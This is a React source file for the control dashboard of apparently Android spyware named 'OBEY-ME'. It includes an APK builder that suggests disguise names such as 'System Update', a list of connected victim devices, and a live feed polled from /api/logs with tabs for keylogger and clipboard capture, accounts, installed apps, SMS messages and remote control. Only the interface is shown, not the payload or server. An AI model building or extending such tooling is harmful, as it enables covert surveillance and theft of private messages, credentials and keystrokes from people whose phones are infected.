"use client";
import { useEffect, useState } from 'react';

export default function CommandCenter() {
  const [activeTab, setActiveTab] = useState('keylogger');
  const [logs, setLogs] = useState([]);

  useEffect(() => {
    const interval = setInterval(async () => {
      const res = await fetch('/api/logs');
      const data = await res.json();
      setLogs(data);
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-[#0a0f1a] text-white p-6 font-sans">
      {/* Header */}
      <div className="flex justify-between items-center mb-6">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 bg-indigo-500 rounded-lg flex items-center justify-center text-white font-bold">B</div>
          <span className="text-2xl font-bold tracking-wide">OBEY-ME</span>
        </div>
        <div className="flex gap-4 text-sm text-gray-400">
          <span className="cursor-pointer hover:text-white">Builder</span>
          <span className="bg-red-900/50 text-red-400 px-3 py-1 rounded-full text-xs flex items-center gap-1"><span className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></span> SYSTEM ACTIVE</span>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        {/* Left Side - APK Builder */}
        <div className="bg-[#111827] p-5 rounded-2xl border border-gray-800 shadow-xl">
          <h3 className="flex items-center gap-2 text-indigo-400 font-semibold mb-4">▲ APK Builder</h3>
          <div className="space-y-4">
            <div>
              <label className="text-xs text-gray-400 block mb-1">APP NAME</label>
              <input type="text" placeholder="e.g. System Update" className="w-full bg-[#1f2937] rounded p-2 text-sm outline-none border border-gray-700 focus:border-indigo-500" />
            </div>
            <div>
              <label className="text-xs text-gray-400 block mb-1">PACKAGE NAME</label>
              <input type="text" placeholder="com.system.service.booster" className="w-full bg-[#1f2937] rounded p-2 text-sm outline-none border border-gray-700 focus:border-indigo-500" />
            </div>
            <div>
              <label className="text-xs text-gray-400 block mb-1">WEBVIEW URL</label>
              <input type="text" placeholder="https://..." className="w-full bg-[#1f2937] rounded p-2 text-sm outline-none border border-gray-700 focus:border-indigo-500" />
            </div>
            <div>
              <label className="text-xs text-gray-400 block mb-1">BUILD TYPE</label>
              <select className="w-full bg-[#1f2937] rounded p-2 text-sm outline-none border border-gray-700">
                <option>Main App (Core Service)</option>
              </select>
            </div>
            <button className="w-full bg-indigo-600 hover:bg-indigo-500 transition py-2 rounded text-sm font-semibold">🚀 BUILD APK</button>
            <div className="bg-[#0a0f1a] border border-green-800/50 rounded p-3 text-center">
              <div className="text-green-400 text-xs mb-1">✅ BUILD COMPLETE</div>
              <button className="w-full bg-cyan-600 hover:bg-cyan-500 transition py-1 rounded text-xs flex items-center justify-center gap-1">⬇ DOWNLOAD APK</button>
            </div>
          </div>
        </div>

        {/* Right Side - Connected Devices */}
        <div className="bg-[#111827] p-5 rounded-2xl border border-gray-800 shadow-xl col-span-1 md:col-span-2">
          <h3 className="flex items-center justify-between text-cyan-400 font-semibold mb-4 border-b border-gray-800 pb-3">
            <span>📱 Connected Devices <span className="bg-cyan-900/30 text-cyan-300 px-2 py-0.5 rounded text-xs ml-2">1 Online</span></span>
            <span className="text-gray-500 text-sm">🔄</span>
          </h3>
          <div className="flex items-center justify-between bg-[#1f2937] p-3 rounded-lg text-xs">
            <div className="flex flex-col gap-0.5">
              <span className="font-bold">CPH2577</span>
              <span className="text-gray-500 text-[10px]">46fd6cc0ba0ac7</span>
            </div>
            <div className="text-center">
              <span className="text-green-400">🔋 81%</span>
            </div>
            <div className="bg-red-900/30 px-3 py-1 rounded-full text-red-400 text-[10px]">● Offline</div>
            <button className="bg-cyan-700 px-4 py-1.5 rounded-full text-[10px] hover:bg-cyan-600 transition">🚀 Uninstall</button>
          </div>
        </div>
      </div>

      {/* Bottom - Live Feed */}
      <div className="mt-6 bg-[#111827] p-5 rounded-2xl border border-gray-800 shadow-xl">
        <div className="flex flex-wrap gap-2 mb-4 border-b border-gray-800 pb-3 overflow-x-auto">
          {['Keylogger & Clipboard', 'Accounts', 'Installed Apps', 'SMS Messages', 'Remote Control'].map((tab, idx) => (
            <button key={idx} onClick={() => setActiveTab(tab)} className={`px-4 py-1.5 rounded-full text-xs transition ${activeTab === tab ? 'bg-purple-600 text-white' : 'bg-[#1f2937] text-gray-400 hover:text-white'}`}>
              {tab}
            </button>
          ))}
        </div>
        <div className="flex items-center justify-between mb-3 text-sm">
          <span className="flex items-center gap-2"><span className="text-cyan-400">📡</span> Live Feed</span>
          <span className="bg-red-900/40 text-red-400 px-3 py-1 rounded-full text-xs flex items-center gap-1"><span className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse"></span> LIVE</span>
        </div>
        
        <div className="space-y-3 max-h-[400px] overflow-y-auto pr-2">
          {logs.length === 0 && <div className="text-gray-500 text-center py-6 text-xs">কোনো ডাটা এখনো আসেনি...</div>}
          {logs.map((log, i) => (
            <div key={i} className="bg-[#0a0f1a] border border-gray-800 p-4 rounded-xl">
              <div className="text-xs text-purple-400 font-bold mb-1">{log.type}</div>
              <div className="text-sm text-gray-200 mb-1">{log.message}</div>
              <div className="text-[10px] text-gray-500">{new Date(log.timestamp).toLocaleString()}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
